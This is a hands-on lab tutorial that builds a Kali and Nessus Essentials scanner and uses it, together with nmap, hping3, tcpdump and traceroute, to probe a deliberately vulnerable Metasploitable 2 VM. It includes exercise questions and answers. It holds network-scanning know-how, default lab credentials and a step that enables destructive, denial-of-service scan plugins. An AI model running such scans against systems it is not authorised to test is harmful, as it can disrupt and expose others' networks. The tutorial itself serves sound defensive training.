Once this is done, run sudo apt-get update and then sudo apt-get upgrade (typing ‚ÄúY‚Äù to confirm the upgrade) to update your system tools to the latest versions. This may take a few minutes to complete. Now that our scanner VM base image is set up and ready to go, we need to register for a Nessus Essentials activation code. Once submitting your registration, you should receive an email from no-reply@tenable. com with your License key and a button-link to download Nessus. Within Kali, open the Nessus download link which will take you to the Nessus downloads page. Find the Nessus-[current. version]-debian[X]_amd64. deb Nessus binary (which is suited for Debian 9, 10 and a variety of Kali Linux versions). Click ‚ÄúI Agree‚Äù on the License Agreement and save the file directly to your Kali host. To install Nessus, follow the appropriate guide Tenable has provided. If you are using Kali, use this guide. Navigate to the directory you downloaded the Nessus binary to and run the following command. sudo dpkg -i Nessus-&lt;version number&gt;-debian6_amd64. deb Once installed, start the Nessus scanner service nessusd by running‚Ä¶sudo service nessusd start ‚Ä¶and then verify it is running using the following command‚Ä¶sudo service nessusd status Now, you can navigate to https://kali:8834/. You may need to click through a certificate-related security warning within the Kali browser. Once on the Nessus web-server, you should see a wizard for installing a variety of different Nessus versions. Select ‚ÄúNessus Essentials‚Äù and proceed with installing Nessus using this guide. The installation may take some time as it needs to download and compile a large database of Nessus plugins. While Nessus initializes, let‚Äôs make sure we have all the other utilities needed for the lab exercises. We‚Äôll need to ensure we have Nmap, tcpdump, hping3, ping and traceroute. Kali Linux comes with all of these tools so no additional setup is needed. The target system we will be scanning with our Nessus-infused Kali machine will be a Metasploitable 2 VM. This VM can be downloaded here. Once downloaded and un-zipped, you can double-click on the Metasploitable. vmx file to have it open directly in VMware. With Metasploitable running, login to the system (defaults creds are msfadmin / msfadmin) and run ifconfig to see what the IP address is. Similarly, get the IP address of your kali instance by running ipconfig locally on that machine. With both IPs in-hand, you can test connectivity between them using the following command. Be sure to test connectivity in both directions! You‚Äôll know if the connection is working if you see ‚Äú1 packets transmitted, 1 received‚Ä¶‚Äù in the output from the command below. ping -c 1 TARGET_IP For more info and tips on Metasploitable, check out this guide by HD Moore. Exercise 0 Questions: Question 0. 1What are the default credentials for Kali and Metasploitable 2? How would you change a user‚Äôs password on either of these systems? ‚Äì&gt; Answer Question 0. 2How can you update Kali Linux? ‚Äì&gt; Answer Question 0. 3What is Network Address Translation? ‚Äì&gt; Answer Question 0. 4In what ways can you interact with (e. g. start, stop, restart, check status of) system services (such as nessusd) on Linux? ‚Äì&gt; Answer Question 0. 5What is the default number of ICMP requests made by the Linux ping utility (e. g. ping 172. 16. 84. 2)? ‚Äì&gt; Answer * OK! We have now finished the lab setup exercise. Let‚Äôs move on to the next step. Exercise 1: Network Tools Primer: Before we proceed to the scanning sections of the lab, let‚Äôs take a quick sojourn into a few basic network utilities and how we would use them for basic VM engineering and troubleshooting. Network Tools tcpdump ping hping3 traceroute NmaptcpdumpTcpdump is an excellent tool for network troubleshooting, something you may find yourself doing quite a bit as a VM analyst/engineer. I won‚Äôt cover Tcpdump in-depth but I think this guide by Daniel Miessler is worth reading. I recommend going through at least the first six sections of that writeup (up to ‚ÄúShow Traffic by Protocol‚Äù). Let‚Äôs go through a quick exercise to demonstrate the power of Tcpdump. On your Kali instance, open two terminal windows side-by-side. In one terminal window, run the following tcpdump command. You will need to run it as root for it to work. Replace METASPLOITABLE_IP with the IP of your Metasploitable 2 instance. sudo tcpdump -i eth0 -n host METASPLOITABLE_IP ‚Ä¶in the second terminal window, run the following hping3 command (we‚Äôll cover hping3 in more detail shortly) What this command does is send a single TCP SYN to port 22 on the Metasploitable system. sudo hping3 -p 22 -S -c 1 METASPLOITABLE_IP What you‚Äôll see as the immediate output of this command is shown below‚Ä¶ Essentially, hping3 is letting us know that it sent the SYN (as denoted by the ‚Äú-S‚Äù in the hping3 command) and received a SYN/ACK (as denoted by the ‚Äú‚Ä¶flags=SA‚Ä¶‚Äù) from the Metasploitable box. Great!HPING 172. 16. 84. 3 (eth0 172. 16. 84. 3): S set, 40 headers + 0 data byteslen=46 ip=172. 16. 84. 3 ttl=64 DF id=0 sport=22 flags=SA seq=0 win=5840 rtt=11. 8 ms--- 172. 16. 84. 3 hping statistic ---1 packets transmitted, 1 packets received, 0% packet lossround-trip min/avg/max = 11. 8/11. 8/11. 8 ms Moving back to the tcpdump window we see the following output. From this output, we can see the initial SYN (as denoted by the ‚ÄúS‚Äù flag in Flags [S]), sent from our Kali instance to the Metasploitable system. Then, we see two records after that, one with the flags ‚Äú[S. ]‚Äù and another with the flags ‚Äú[R]‚Äù. The second record is the response SYN/ACK from the SSH service listening on the Metasploitable system. The third record is hping3 gracefully closing out the connection with an RST. listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes14:44:11. 987603 IP 172. 16. 84. 2. 1662 &gt; 172. 16. 84. 3. 22: Flags [S], seq 2133837101, win 512, length 014:44:11. 988190 IP 172. 16. 84. 3. 22 &gt; 172. 16. 84. 2. 1662: Flags [S. ], seq 1870315893, ack 2133837102, win 5840, options [mss 1460], length 014:44:11. 988206 IP 172. 16. 84. 2. 1662 &gt; 172. 16. 84. 3. 22: Flags [R], seq 2133837102, win 0, length 0As you can see, there is more than meets the eye when it comes to network traffic and tool output. Tcpdump is a great way for us to see exactly what is happening ‚Äúunder the hood‚Äù. I highly encourage you to open up Tcpdump and capture traffic in a variety of different situations - troubleshooting, trying out a new tool, etc‚Ä¶ You will learn a lot about how a tool works by inspecting the traffic it generates. pingThere‚Äôs not much to discuss with ping but it is worth mentioning here in the event that you are unfamiliar with what it is and how to use it. ping is a routinely used tool for diagnosing network connections. It sends an ICMP echo request and expects an ICMP echo reply. If you get a reply, this means the target IP is routable (at least using ICMP) and if you don‚Äôt get the reply, it may not be routable. The command below demonstrates a ping from my Kali box to the Metasploitable box. ping -c 1 172. 16. 84. 3 PING 172. 16. 84. 3 (172. 16. 84. 3) 56(84) bytes of data. 64 bytes from 172. 16. 84. 3: icmp_seq=1 ttl=64 time=0. 537 ms--- 172. 16. 84. 3 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0. 537/0. 537/0. 537/0. 000 msping is typically one of the first things I will try when troubleshooting network connectivity. Keep in mind! The absence of an ICMP echo reply though does not necessarily mean a machine is not routable. hping3hping3, similar to the classic ping utility is a network tool built for troubleshooting - but really has much more functionality. Using hping3 you can custom-build ICMP, UDP and TCP packets to an exact specification and then fire them off to test firewalls, perform port scanning, fingerprint OS‚Äôs and a lot more. hping3 is similar in some ways to Nmap but much lighter-weight which makes it particularly good for quick troubleshooting. To get started, I recommend reviewing the hping3 ‚Äúman page‚Äù to get a better idea of its capabilities and the flags required to invoke different functionality. OK, now let‚Äôs get an idea of the listening services on the Metasploitable box. We can do so by running ‚Äúnetstat -tulpn‚Äù on the Metasploitable host. From the output of the netstat command, we can see there are quite a few listening services. Moving over to the Kali scanner host, we can use the hping3 command below to verify whether services are reachable from our scan host. The command below demonstrates that TCP port 53 on the Metasploitable is responding to SYN packets from our scanner host. sudo hping3 -S -c 1 -p 53 172. 16. 84. 3 HPING 172. 16. 84. 3 (eth0 172. 16. 84. 3): S set, 40 headers + 0 data byteslen=46 ip=172. 16. 84. 3 ttl=64 DF id=0 sport=53 flags=SA seq=0 win=5840 rtt=3. 5 ms--- 172. 16. 84. 3 hping statistic ---1 packets transmitted, 1 packets received, 0% packet lossround-trip min/avg/max = 3. 5/3. 5/3. 5 msI encourage you to explore other options and functionality of the hping3 tool and think of other ways you might be able to use it for basic scanning, troubleshooting, etc‚Ä¶ traceroutetraceroute (or tracert on Windows) is a simple network utility which tracks the route packets take on an IP network to a destination host. This handy tool is useful when diagnosing routing failures which may exist between a scan host and the target host. This short exercise will demonstrate the route a network packet takes from your Kali system to your actual router/gateway. First, figure out the IP address of your router. An easy way to do this may be to just run ipconfig/ifconfig, figure out your parent host IP address and then change the fourth octet to a ‚Äú1‚Äù. For example, if your parent host IP is 192. 168. 1. 39, your router‚Äôs IP may likely be 192. 168. 1. 1. OK, with your router IP address in-hand, go back to your Kali system and try the following traceroute command. Replace 192. 168. 1. 1 with the IP address of your router. traceroute 192. 168. 1. 1traceroute to 192. 168. 1. 1 (192. 168. 1. 1), 30 hops max, 60 byte packets 1 172. 16. 84. 1 (172. 16. 84. 1) 0. 311 ms 0. 179 ms 0. 110 ms 2 192. 168. 1. 1 (192. 168. 1. 1) 1. 359 ms 1. 291 ms 1. 241 msHere you will see that in order for the packet to reach its destination (the router IP), it had to traverse the IP 172. 16. 84. 1 which is the internal gateway for your virtualized host. On my parent host machine, this is the bridge100 VMware interface (which can be seen by running ifconfig on the parent host). bridge100: flags=8a63&lt;UP,BROADCAST,SMART,RUNNING,ALLMULTI,SIMPLEX,MULTICAST&gt; mtu 1500 options=3&lt;RXCSUM,TXCSUM&gt; ether 02:3e:e1:2c:ad:64 inet 172. 16. 84. 1 netmask 0xffffff00 broadcast 172. 16. 84. 255If I was unable to reach the router with traceroute, the culprit could very likely be this intermediary router. Don‚Äôt stop here though, think of some other things you can trace! NmapFinally, let‚Äôs take quick peek at Nmap. Nmap is a very full-featured network exploration, scanning and security auditing tool. It can scan multiple hosts at a time, perform service fingerprinting and enumeration and even run custom-built scripts which can audit the security of target hosts and even perform exploitation of vulnerabilities. It is a powerful tool, but you need only have a limited understanding of it‚Äôs feature-set to aid you in every-day VM engineering/analyst responsibilities. For this exercise, let‚Äôs just do a quick full-port-scan of the Metasploitable host from our Kali scan host. As usual, I first recommend reviewing the features and flags of Nmap by running ‚Äúman Nmap‚Äù. Now, let‚Äôs run a simple, plain Nmap scan of the Metasploitable host using the command shown below. sudo nmap 172. 16. 84. 3Starting Nmap 7. 91 ( https://nmap. org ) at 2021-04-21 09:45 EDTNmap scan report for 172. 16. 84. 3Host is up (0. 0027s latency).

COOL! As a VM analyst you may use this to quickly diagnose whether a port is open. This is quicker than running a network scan from a traditional vulnerability scanner. Exercise 1 Questions: Question 1. 1What protocol does Kali use when you run traceroute against your Metasploitable host? (TIP: Try using tcpdump to investigate. ) ‚Äì&gt; Answer Question 1. 2What port does ping use? ‚Äì&gt; Answer Question 1. 3How can you send a UDP packet to port 69 (of the Metasploitable box) using hping3? What is returned from Metasploitable as a result of this packet? Why is this the response? ‚Äì&gt; Answer Question 1. 4When using traceroute targeting your home router, what is the TTL of the first packet sent by traceroute? What is returned in response to this packet and from what device? ‚Äì&gt; Answer Question 1. 5By default what ports does Nmap scan? How can you configure Nmap to scan all ports? ‚Äì&gt; Answer Exercise 2: Discovery Scanning: Alright, so we have our lab setup and we have some familiarity with basic network utilties. Let‚Äôs begin the network scanning portion of the lab with the typical Step 1, Discovery Scanning. Typically, prior to performing deeper vulnerability scans you want to first gather an inventory of in-scope devices on your target network. For the lab, we are focusing most of our targeted efforts at the Metasploitable box, but for this exercise, we can (if you would like) expand the scope of our scanning to include other devices on your home network. Follow the steps below to get started‚Ä¶ On your Kali machine, log into the Nessus web interface. You can do this by opening up Firefox in Kali and navigating to the URL https://127. 0. 0. 1:8834/. Create a new scan by clicking the ‚ÄúNew Scan‚Äù button in the top right corner of the Nessus interface. Click the ‚ÄúHost Discovery‚Äù section of the ‚ÄúScan Templates‚Äù menu. Within the scan creation wizard, give the scan an appropriate name (such as ‚ÄúDiscovery Scan‚Äù). Populate the ‚ÄúTargets‚Äù section of the scan wizard with the IPs you wish to scan. For this, at a minimum, input the IP of your Metasploitable host. Optionally, you can choose to put in the class-C subnet that your home network uses (likely something similar to 192. 168. 1. 0/24). Click the ‚ÄúSave‚Äù button at the bottom of the scan creation wizard. Click the ‚ÄúPlay‚Äù button at the right hand side of the scan record on the main Nessus interface. This will run the scan. Give the scan a few minutes to complete. Once the scan completes, click anywhere on the record to open up the scan results. Within this view, you can see the IPs found, and any vulnerabilities/plugins that were identified during the scan. Congrats! You just performed a discovery scan with Nessus! One important thing to keep in mind with the free version of Nessus is that though there is no limit on the devices you can discover with Nessus, you will only be able to perform vulnerability scanning against a max of 16 target systems. Exercise 2 Questions: Question 2. 1By default, what ‚Äúping methods‚Äù are used by a Nessus host discovery scan. ‚Äì&gt; Answer Question 2. 2What are the two Nessus plugins triggered by the Nessus host discovery scan? ‚Äì&gt; Answer Question 2. 3Does the host discovery scan perform ‚ÄúCredentialed checks‚Äù? How can you confirm this within Nessus? ‚Äì&gt; Answer Question 2. 4What ping method was successful in identifying the live Metasploitable host? ‚Äì&gt; Answer Exercise 3: Vulnerability Scanning: OK, now that we‚Äôve discovered our target system(s), we now move into the actual vulnerability scanning portion of our VM lifecycle. Tools like Nessus are purpose built with an expansive set of detection plugins to find, classify and even risk-rank vulnerabilities. Network scanning tools have a number of different methods for detecting vulnerabilities, two of these methods are credentialed and uncredentialed scanning. Ideally, where possible, you want all scans to be credentialed. Credentialed scans have higher-fidelity results (less false-positives) and they also find more issues overall. With that said, you won‚Äôt always have credentials for a target so you may have to settle for an uncredentialed scan. These two types of scans also function a little differently. Credentialed scans will actually ‚Äúphysically‚Äù login to a target system and enumerate vulnerabilities by running commands directly on the system. Uncredentialed scans on the other hand, are unable to login to the target system and must instead rely on anonymous/remote fingerprinting mechanisms to detect potential vulnerabilities. Let‚Äôs run through a pair of exercises for configuring and running an uncredentialed and credentialed scan respectively. Uncredentialed Scan Create a new scan by clicking the ‚ÄúNew Scan‚Äù button in the top right corner of the Nessus interface. Click the ‚ÄúBasic Network Scan‚Äù section of the ‚ÄúScan Templates‚Äù menu. Within the scan creation wizard, give the scan an appropriate name (such as ‚ÄúUncredentialed Scan‚Äù). Populate the ‚ÄúTargets‚Äù section of the scan wizard with the IPs you wish to scan. For this, input the IP of your Metasploitable host. Click the ‚ÄúSave‚Äù button at the bottom of the scan creation wizard. Click the ‚ÄúPlay‚Äù button at the right hand side of the scan record on the main Nessus interface. This will run the scan. Give the scan a few minutes to complete. It will take a little longer than the host discovery scan. Once the scan completes, click anywhere on the record to open up the scan results. Within this view, click on the ‚ÄúVulnerabilities‚Äù tab and you will be able to view all vulnerabilities/plugins that were identified during the scan. As you can see, the uncredentialed scan yields A LOT more plugins being returned and plenty of vulnerabilities found. (Remember, there were only two plugins found during the discovery scan. ) Credentialed Scan Create a new scan by clicking the ‚ÄúNew Scan‚Äù button in the top right corner of the Nessus interface. Click the ‚ÄúBasic Network Scan‚Äù section of the ‚ÄúScan Templates‚Äù menu. Within the scan creation wizard, give the scan an appropriate name (such as ‚ÄúCredentialed Scan‚Äù). Populate the ‚ÄúTargets‚Äù section of the scan wizard with the IPs you wish to scan. For this, input the IP of your Metasploitable host. Click on the ‚ÄúCredentials‚Äù tab of the scan creation wizard and then click ‚ÄúSSH‚Äù. In the right-hand pane change the ‚ÄúAuthentication method‚Äù drop-down to ‚Äúpassword‚Äù and then set the ‚ÄúUsername‚Äù and ‚ÄúPassword‚Äù text-fields each to msfadmin. Click the ‚ÄúSave‚Äù button at the bottom of the scan creation wizard. Click the ‚ÄúPlay‚Äù button at the right hand side of the scan record on the main Nessus interface. This will run the scan. Give the scan a few minutes to complete. Once the scan completes, click anywhere on the record to open up the scan results. Within this view, click on the ‚ÄúVulnerabilities‚Äù tab and you will be able to view all vulnerabilities/plugins that were identified during the scan. As you can see from the image below, and as-predicted (compared to the screenshot of the uncredentialed scan results), there are far more findings with the credentialed scan. Well done! We should now have plenty of vulnerability data to work with for the rest of the exercises in the lab. Exercise 3 Questions: Question 3. 1What different severities does Nessus report for vulnerabilities? ‚Äì&gt; Answer Question 3. 2Given just the uncredentialed scan, what is the most severe vulnerability according to Nessus? Why has Nessus given this vulnerability this rating? ‚Äì&gt; Answer Question 3. 3Now, according to the credentialed scan results, what is the most severe vulnerability according to Nessus? Why does this vulnerability have a higher VPR severity score than the previously identified vulnerability? ‚Äì&gt; Answer Question 3. 4Using what plugin(s) can we validate that the credentialed scan was successful in logging into the target system. ‚Äì&gt; Answer Question 3. 5The credentialed scan was successful in logging into the target Metasploitable system, but had some issue performing everything it was trying to accomplish. What happened here? ‚Äì&gt; Answer Exercise 4: Scanning Enrichment: Setting up vulnerability scans is an important first step for a VM professional, but you shouldn‚Äôt stop there. There are always improvements and advancements that can be made within scanning operations or the VM program as a whole. These improvements can help alleviate time spent on manual tasks, reduce MTTR, improve the fidelity of reports or even increase the overall effectiveness of your scans. The challenge in VM is that of scale. How can we scan a lot of systems and triage/resolve an even greater number of vulnerability findings with limited resources? The answer is usually coupling automation with robust prioritization. Below are just a few quick exercises that demonstrate some improvements we can make just within Nessus itself. Keep in mind, when working in an enterprise VM program you will have tools that have VM enrichment capabilities far beyond what Nessus Essentials can offer. For each of the sub-exercises below, first follow these steps. Open your credentialed scan results by clicking on the record on the Nessus main page. Click on the ‚ÄúConfigure‚Äù button to edit the scan configuration. Automation &amp; Scheduling Click on the ‚ÄúSchedule‚Äù side-tab under the ‚ÄúBasic‚Äù section within the configuration wizard. Toggle ‚ÄúEnabled‚Äù. Here you can set a time for the scan to begin as well as an interval for that scan to run on. Scheduled scans are ideal as you may not want to scan certain devices during business hours. Automated, recurring scans mean one less thing a VM professional has to perform manually. Combined, scheduled + recurring scans are an obvious advancement to be made to routine VM operations. Notifications &amp; Filters Click on the ‚ÄúNotifications‚Äù side-tab under the ‚ÄúBasic‚Äù section within the configuration wizard. In the ‚ÄúEmail Recipient(s)‚Äù field you can provide email addresses for those who need to receive alerts on specific vulnerabilities. In the ‚ÄúResult Filters‚Äù area, we can add filters such that notifications are sent only when certain criteria are met. *For example, we may be interested in seeing alerts on all ‚ÄúCritical‚Äù risk vulnerabilities that are known to have an exploit available. We can create these two filters using the following filter-sets. Match All of the following: Exploit Available is equal to true Severity is equal to Critical Most vulnerabilities will likely be addressed through the standard patching process which is governed by SLAs created in coordination between the VM team and the respective IT organization. There are however, some vulnerabilities that may require more immediate analysis and mitigation. Using the notification/filter functionality, we can create alerts which will notify us the instant a vulnerability which meets this urgent criteria is discovered. At which point, we can immediately being to address that finding. Reporting Click on the ‚ÄúREPORT‚Äù section within the ‚ÄúSettings‚Äù tab. Uncheck the box for ‚ÄúShow missing patches that have been superseded‚ÄùToggling this setting will help us remove false-positives from our Nessus reports. This is somewhat self-explanatory. Basically, if a system has a patch which supersedes a missing patch, we don‚Äôt want any plugins to fire for the superseded patch. This will unnecessarily junk up the report with vulnerabilities that are not actually there. Advanced Click on the ‚ÄúADVANCED‚Äù section within the ‚ÄúSettings‚Äù tab. Change the ‚ÄúScan Type‚Äù drop-down to ‚ÄúCustom‚Äù. Click on the ‚ÄúGeneral‚Äù section below the ‚ÄúAdvanced‚Äù pane on the left-hand side. Uncheck the ‚ÄúEnable safe checks‚Äù box within the ‚ÄúGeneral Settings‚Äù pane. This setting should only be disabled under great caution. Disabling ‚ÄúEnable safe checks‚Äù will mean the scan can use certain plugins that are considered highly invasive. This includes destructive attacks, denial of service (DoS) and other kinds of floods. Though this scan can have negative side-effects on a target system, it also adds additional tests that weren‚Äôt otherwise being run. In this way, more potential issues can be identified. Exercise 4 Questions: Question 4. 1Vulnerability scans can by nature be somewhat network-intensive. In the event that a host being actively scanned becomes unresponsive, something like Nessus could DoS the system even further. What can be configured within the scan to prevent this from happening? ‚Äì&gt; Answer Question 4. 2What is the default user-agent for Nessus web application scanning. ‚Äì&gt; Answer Question 4. 3What type of port scanning does Nessus perform by default? ‚Äì&gt; Answer Exercise 5: Reviewing/Analyzing Results: Now that we have our vulnerability scans completed, it‚Äôs time to review the results and analyze the findings. Metasploitable is a ‚Äúpurposefully-vulnerable‚Äù machine and as such, is rife with issues. Though you may not encounter a system that is this bad in the real world, you certainly could find yourself reviewing a box that has many vulnerabilities on it. So let‚Äôs take this system, how should we go about analyzing these vulnerabilities? Below is one sequence that could occur‚Ä¶ OK, so there are a lot of vulnerabilities. We need to start filtering down to just the ones that are of highest importance. Are there any vulnerabilities that are of imminent danger of being exploited? If so, are any of these vulnerabilities mitigated in any way due to other controls within the environment? We can add a filter to see only exploitable vulnerabilities. We are now down to 12 vulnerabilities (this is 12 groups of vulnerabilities as some as you can see, are bundled). That‚Äôs still a lot of vulnerabilities to take on at one time. Let‚Äôs filter this down a little bit more. We can do so by adding some additional filters. Let‚Äôs add a filter for only Critical severity issues as well as a filter for only plugins which are in the ‚ÄúPlugin Family‚Äù, Gain a shell remotely. These filters are shown in the image below‚Ä¶ After these filters have been applied, we have only a few remaining issues (5 total). As a VM analyst who is reviewing these results, I would likely filter down to these findings and proceed with prioritization, reporting and remediation. For each of these findings, I would want to open them up, understand the plugin logic and perform cursory checks to determine whether they we‚Äôre false-positives or not. With credentialed scans though, hoping a finding is a false-positive is often just wishful-thinking. I encourage you to open each of these and to the best of your ability, analyze them to determine the validity of the finding. Specifically, is the vulnerability really exploitable? (COMING SOON: Steps for reproducing manual validation of a vulnerability. Wasn‚Äôt ready in the 1. 0 release. ) Exercise 5 Questions: Question 5. 1What is the CVSS vector for the Shellshock vulnerability? What does ‚ÄúAC:L‚Äù mean within that CVSS vector? ‚Äì&gt; Answer Question 5. 2How did Nessus determine that Metasploitable was vulnerable to Shellshock? ‚Äì&gt; Answer Question 5. 3What is the highest risk finding? ‚Äì&gt; Answer Question 5. 4According to Nessus, what action (mitigation/patch) should be taken to reduce the most risk on the system? ‚Äì&gt; Answer Exercise 6: Reporting: Once we have performed analysis on the findings, we need to deliver something to the appropriate place in order that the finding be mitigated. What I mean by this is that there are stakeholders who need to receive reports which detail these findings so that they can address them. Nessus reports are one way to do this. Creating a report is easy. Inside a scan result, we can click on the ‚ÄúReport‚Äù drop-down in the top right which reveals a number of different report formats available (. pdf, . html and . csv). We can click on any of these to generate that report. Try creating a ‚ÄúCustom‚Äù, and an ‚ÄúExecutive Summary‚Äù report and see what is contained within each. The image above illustrates the wealth of settings available when creating a ‚ÄúCustom‚Äù report with Nessus. I recommend you check all boxes, generate the report and then review that report to see what each of those boxes adds to the final product. Exercise 6 Questions: Question 6. 1If we‚Äôre interested in generating a report for just Critical vulnerabilites. How can this be done? ‚Äì&gt; Answer Question 6. 2Who all might be interested in receiving a vulnerability report from Nessus? (HINT: Think individual groups, stakeholders or other personnel within an organization. ) ‚Äì&gt; Answer Exercise 7: Scripting &amp; Automation: To take Nessus, and really VM, to the next level, we need to step up our game in terms of automation. The best way to do that is by leveraging the Nessus API. The API documentation is available locally within your Nessus instance at ‚Äúhttps://127. 0. 0. 1:8834/api#/overview‚Äù. The API represents boundless opportunity for VM analysts/engineers to automate all manner of operational tasks, thus reducing overhead. I recommend those interested in not only VM but infosec at large, to become very familiar with APIs such as this and learn to write against them programmatically using a scripting language such as Python. To aid you in this journey there are frameworks, built by others in the community that can help you interact with these APIs. For the Nessus API, there is PyNessus, a Nessus REST API client which is fully Apache 2 licensed and built specifically for security auditors, pentesters and VM analysts. As I mentioned, there are countless potential automation ideas that one could think of. One possible project would be to create a script that could kick off a scan against a target system. The use-case for this project would be as follows‚Ä¶ As a VM analyst you may be asked by a system owner to re-scan a system following patch application. The system owner is interested in whether the patch has been successfully applied and thus the vulnerability is mitigated. Rather than wait for the next scan window, the system owner would like to know as soon as possible whether the vulnerability has been eradicated. Typically, a VM analyst would kick off a targeted scan of this system manually. But instead, what if you wrote a script that took one argument (a target IP) and auto-ran a scan of that system. This bootcamp is not designed to be a course in Python and as such, will not cover in-depth how to create the script I detailed above. I recommend researching how best to programmatically interact with REST APIs. One good resource would be Python &amp; APIs: A Winning Combo for Reading Public Data. With that said, I would like to provide this script myself so others may have an example to build off of and reference as they create other useful scripts of their own. Example script is currently being developed. Stay tuned! Finally, I‚Äôd like to list a few other potential script ideas that someone could work on if they were interested! Building off the previous idea - a script that could auto-run a scan against a provided target but also take as input a Plugin ID and return true or false if that plugin is found within the results of that scan. Ultimately, the system owner is interested if a plugin has ‚Äúfallen off‚Äù the report so rather than go into the scan results and see manually, why not have the result returned programmatically. A script that can take a list of plugins as input and return all the hosts that have one or more of those plugins. In the event of a large patch release by a vendor, we may want to quickly see all the hosts affected by a set of plugins. A script that will take an IP as input and return the last time it was scanned, how long the scan was and whether it was successfully scanned with credentials. This is a common question in the VM world. Take this scenario as an example - there may be some issue (system degradation) with a system and the owner is wondering if the scan itself is the culprit. The system owner may provide logs indicating some malfunction during a certain time and would like to blame the scan for the degradation. You may be able to quickly diagnose this using this script which will tell you when the scan was last performed. If the scan timing overlaps with when the system was experiencing a degraded state, it may very well be the scanners fault. Otherwise, we can rule out the scanner as being the cause. Alternatively, you may find that the results of the scan look a little off, and you‚Äôd like to quickly troubleshoot whether the last scan was with credentials. As we know, non-credentialed scans can introduce false-positives into the scan results. Thanks for taking the time to work your way through these exercises and happy scriptin‚Äô!

You can determine this by running the tcpdump command shown below‚Ä¶ tcpdump -i eth0 -n host [METASPLOITABLE_IP]‚Ä¶then running traceroute against your Metasploitable host. In the tcpdump output, you will see a number of UDP datagrams being sent to a variety of different ports (shown below).

This can be seen by running a tcpdump capture at the same time as the ping and seeing no ports included. The tcpdump capture shown below shows no ports after the IP addresses. listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes11:21:07. 451104 IP 172. 16. 84. 2 &gt; 172. 16. 84. 3: ICMP echo request, id 50276, seq 1, length 6411:21:07. 451781 IP 172. 16. 84. 3 &gt; 172. 16. 84. 2: ICMP echo reply, id 50276, seq 1, length 64Back to Question Answer 1. 3The ‚Äú-2‚Äù crafts a UDP datagram and the ‚Äú-p 69‚Äù will send it to port 69. hping3 -2 -p 69 METASPLOITABLE_IP -c 1As you can see in the tcpdump output shown below, nothing is returned from the Metasploitable box. listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes11:30:24. 006909 IP 172. 16. 84. 2. 2758 &gt; 172. 16. 84. 3. tftp: TFTP, length 0 [|tftp]^C1 packet captured1 packet received by filter0 packets dropped by kernelNothing is returned because UDP is connectionless and therefore will not return responses for UDP services that are listening and receive data. Back to Question Answer 1. 4The TTL of the first packet sent is 1. Determine this by running the tcpdump packet capture shown below while executing the traceroute. In this ouput you can see it says ‚Äú‚Ä¶ttl 1‚Ä¶‚Äù If you‚Äôd like to understand why the TTL is set this way, I recommend researching host traceroute works. sudo tcpdump -i eth0 -vtcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes11:33:05. 006272 IP (tos 0x0, ttl 1, id 19407, offset 0, flags [none], proto UDP (17), length 60)Further down in the packet capture, you will see a record with the same ‚Äúid‚Äù as that first UDP packet described above. This is the ICMP packet returned from the ‚Äúnext-hop‚Äù router which is in fact your VMware bridge router. 172. 16. 84. 1 &gt; 172. 16. 84. 2: ICMP time exceeded in-transit, length 36 IP (tos 0x0, ttl 1, id 19407, offset 0, flags [none], proto UDP (17), length 60)Back to Question Answer 1. 5By default, Nmap only scans the top 1000 ports (this list is available on your Kali box at /usr/share/nmap/nmap-services). You can scan all ports using the command below. Essentially, you are just specifying all ports (using ‚Äú-p0-65535‚Äù) in the command. nmap -p0-65535 METASPLOITABLE_IPBack to Question Exercise 2 Answers: Answer 2. 1TCP, ARP, ICMP. This is determined by going to the ‚ÄúDISCOVERY‚Äù section within the ‚ÄúSettings‚Äù tab of the host discovery scan creation wizard. Within this pane you will see TCP, ARP and ICMP listed under ‚ÄúPing hosts using:‚Äù Back to Question Answer 2. 2‚ÄúNessus Scan Information‚Äù, plugin 19506 and ‚ÄúPing the remote host‚Äù, plugin 10180. Back to Question Answer 2. 3In the output of the 19506 plugin, there is a line which reads ‚ÄúCredentialed checks : no‚Äù. Back to Question Answer 2. 4Though it may vary, the likely answer is ARP. The successful method can be determined by reviewing the 10180 plugin‚Äôs output as shown below. The remote host is upThe host replied to an ARP who-is query. Hardware address : 00:0c:29:4b:79:e4Back to Question Exercise 3 Answers: Answer 3. 1Nessus uses a 5-tier severity scale - Critical, High, Medium, Low, Informational. Tenable has also recently introduced a new risk-scoring methodology known as VPR. Back to Question Answer 3. 2By opening up the uncredentialed scan results and clicking on the ‚ÄúVPR Top Threats‚Äù tab, you will see just one Critical vulnerability, ‚ÄúApache Tomcat AJP Connector Request Injection (Ghostcat)‚Äù with a VPR score of 9. 6. It‚Äôs been given this rating despite it‚Äôs CVSSv3 Impact Score being only a 5. 9. This is due to the readily available exploit code and high Threat Intensity. Back to Question Answer 3. 3By opening up the credentialed scan results and clicking on the ‚ÄúVPR Top Threats‚Äù tab, you will see several Critical severity issues. The top issue is ‚ÄúBash Remote Code Execution‚Äù, with a VPR severity score of 9. 8. This is scored higher than the previously identified hihg-risk issue in the uncredentialed scan due to its Threat Intensity being ‚ÄúVery High‚Äù as opposed to just ‚ÄúHigh‚Äù. This intensity is calculated based on the number and frequency of recently observed threat events (by Tenable themselves presumably). Back to Question Answer 3. 4There are quite a few different ways to troubleshoot/validate credentialed scans. A few such options include the following plugins‚Ä¶ Plugin 19506 can be used by looking at the plugin output - specifically where it says ‚ÄúCredentialed checks : yes, as ‚Äòmsfadmin‚Äô via ssh‚Äù. The presence of plugin 117887, ‚ÄúLocal Checks Enabled‚Äù is a good sign that the scan was successful in logging in and performing local checks. Plugin 141118, ‚ÄúTarget Credential Status by Authentication Protocol - Valid Credentials Provided‚Äù very explicitly claims that ‚Äúvalid credentials‚Äù have been provided. This would be another sure-fire way to claim that the scan was successfully performed with credentials. Back to Question Answer 3. 5The scan was performed with the credentials msfadmin / msfadmin. Though these are valid credentials for the Metasploitable system, the user msfadmin does not sufficient privileges on the system for all of Nessus‚Äô checks. In fact, plugin 110385, ‚ÄúTarget Credential Issues by Authentication Protocol - Insufficient Privilege‚Äù tells us this exact thing. Back to Question Exercise 4 Answers: Answer 4. 1There is a toggle in the ‚ÄúAdvanced‚Äù settings within the scan configuration wizard which can ‚ÄúStop scanning hosts that become unresponsive during scan‚Äù. Toggling this on can help with systems that are more sensitive in nature or that are experiencing responsiveness issues. Back to Question Answer 4. 2Mozilla/4. 0 (compatible; MSIE 8. 0; Windows NT 5. 1; Trident/4. 